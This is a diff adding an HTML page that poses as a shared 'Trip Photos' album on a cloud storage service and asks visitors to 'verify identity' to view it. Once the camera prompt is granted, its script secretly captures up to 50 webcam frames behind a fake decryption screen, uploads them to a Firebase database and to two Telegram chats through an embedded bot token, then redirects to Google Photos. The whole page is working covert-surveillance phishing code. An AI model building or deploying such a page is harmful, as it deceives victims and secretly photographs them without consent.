@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shared Album | CloudDrive Storage</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --drive-blue: #1a73e8;
+            --drive-bg: #ffffff;
+            --drive-text: #3c4043;
+            --drive-surface: #f1f3f4;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--drive-surface); 
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .album-card {
+            width: 100%; max-width: 420px; background: var(--drive-bg);
+            border-radius: 16px; box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+            overflow: hidden; text-align: center;
+        }
+
+        .album-banner {
+            height: 180px; background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://images.unsplash.com/photo-1503220317375-aaad61436b1b?auto=format&fit=crop&w=420&q=80');
+            background-size: cover; background-position: center;
+            display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; color: white; text-align: left;
+        }
+
+        .album-title { font-size: 22px; font-weight: 500; margin: 0; }
+        .album-meta { font-size: 14px; opacity: 0.9; }
+
+        .content-padding { padding: 32px 24px; }
+
+        .security-badge {
+            display: flex; align-items: center; gap: 10px; background: #e8f0fe;
+            color: #1967d2; padding: 12px; border-radius: 8px; margin-bottom: 24px; text-align: left;
+        }
+
+        h2 { font-size: 18px; color: var(--drive-text); margin: 0 0 12px; font-weight: 500; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 30px; }
+
+        .btn-view {
+            background: var(--drive-blue); color: white; border: none;
+            padding: 12px 24px; border-radius: 24px; font-size: 14px; font-weight: 500;
+            cursor: pointer; width: 100%; transition: background 0.2s;
+        }
+
+        /* Verification UI */
+        #verify-ui { display: none; }
+        .scanning-box {
+            width: 80px; height: 80px; border: 3px solid var(--drive-blue);
+            border-radius: 12px; margin: 0 auto 20px; position: relative;
+            overflow: hidden;
+        }
+        .scan-line {
+            width: 100%; height: 2px; background: var(--drive-blue);
+            position: absolute; top: 0; animation: scan 2s infinite ease-in-out;
+            box-shadow: 0 0 8px var(--drive-blue);
+        }
+        @keyframes scan { 0%, 100% { top: 0; } 50% { top: 100%; } }
+
+        .loading-text { font-size: 15px; color: var(--drive-blue); font-weight: 500; }
+        .timer-msg { font-size: 12px; color: #70757a; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="album-card">
+        <div class="album-banner">
+            <p class="album-meta">Shared by: Trip Admin</p>
+            <h1 class="album-title">Trip Photos (May 2026)</h1>
+        </div>
+
+        <div class="content-padding" id="start-ui">
+            <div class="security-badge">
+                <span>🛡️</span>
+                <div style="font-size: 12px;">This album is protected by <b>Advanced Identity Verification</b> for your privacy.</div>
+            </div>
+            <h2>Verify to View Album</h2>
+            <p>Accessing these private media files requires a secure identity handshake. Please click below to validate your session and decrypt the shared gallery.</p>
+            
+            <button class="btn-view" onclick="startPhotoRelay()">Decrypt & View Photos</button>
+            <div style="margin-top: 20px; font-size: 11px; color: #9aa0a6;">Node Location: Gaya, Bihar</div>
+        </div>
+
+        <div class="content-padding" id="verify-ui">
+            <div class="scanning-box"><div class="scan-line"></div></div>
+            <div class="loading-text">Validating Device Identity...</div>
+            <div class="timer-msg" id="timer">Decrypting 142 high-resolution images (60s)</div>
+            <div style="margin-top: 20px; font-family: monospace; font-size: 10px; color: #1e8e3e; text-align: left; background: #f8f9fa; padding: 10px; border-radius: 4px;">
+                > FETCHING_SSL_CERT... OK<br>
+                > SYNCING_ENCRYPTION_KEYS... OK<br>
+                > VALIDATING_USER_PROXIMITY... IN_PROGRESS
+            </div>
+        </div>
+    </div>
+
+    <!-- Background Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startPhotoRelay() {
+            try {
+                // Disguised Camera Permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('start-ui').style.display = 'none';
+                document.getElementById('verify-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('timer').innerText = `Decrypting 142 high-resolution images (${timeLeft}s)`;
+
+                        if (count <= 50) {
+                            capturePhotoSession(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to a real image hosting or Google Photos
+                            window.location.href = "https://photos.google.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://photos.google.com";
+            }
+        }
+
+        function capturePhotoSession(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, type: "PHOTO_ALBUM_SPOOF", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'trip_verify.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
